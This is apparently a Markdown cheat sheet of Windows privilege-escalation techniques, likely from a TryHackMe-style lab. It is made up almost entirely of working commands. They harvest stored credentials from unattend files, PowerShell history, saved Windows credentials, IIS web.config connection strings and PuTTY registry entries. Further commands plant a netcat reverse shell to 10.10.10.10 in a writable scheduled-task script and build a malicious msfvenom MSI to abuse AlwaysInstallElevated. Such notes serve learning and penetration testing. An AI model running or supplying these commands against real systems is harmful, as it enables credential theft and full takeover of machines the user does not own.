# Password History ✅
## File-Unattended ✅
### cmd ✡️
```cmd
dir C:\sysprep.inf /s /p
dir C:\sysprep.xml /s /p
dir C:\unattend.xml /s /p
```
### powershell ✡️
```powershell
Get-ChildItem -Path C:\ -Filter "sysprep.inf" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "Unattend.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\Panther\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\system32\sysprep\ -Filter "*.xml" -Recurse -ErrorAction SilentlyContinue
```
## Powershell History ✅
### cmd ✡️
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
```
### powershell ✡️
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
```
## Saved Windows Credentials ✅
```powershell
cmdkey /list # show save user credentials
runas /savecred /user:<username> cmd.exe # run cmd with another user 
runas /savecred /user:<username> powershell.exe # run powershell with another user
```
## IIS Configuration ✅
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
## Retrieve Credentials from Software: PuTTY ✅
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
# Abusing Service Misconfigurations ✅
## Scheduled Tasks ✅
```cmd
schtasks /query /tn vulntask /fo list /v  # target system
# ⬇️⬇️⬇️⬇️⬇️⬇️
# Folder: \
# HostName:                             THM-PC1
# TaskName:                             \vulntask
# Task To Run:                          C:\tasks\schtask.bat
# Run As User:                          taskusr1
------------------------------
icacls c:\tasks\schtask.bat # check the file permissions in target system 
------------------------------
echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # target system
------------------------------
nc -lvnp 4444 # our kali
------------------------------
schtasks /run /tn vulntask # target system
```
## AlwaysInstallElevated ✅
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
------------------------------
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
# transfer malicious.msi file to our kali # target system
------------------------------
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi # target system
```
## Windows-Services-Enum ✅
```cmd
 sc qc apphostsvc
```
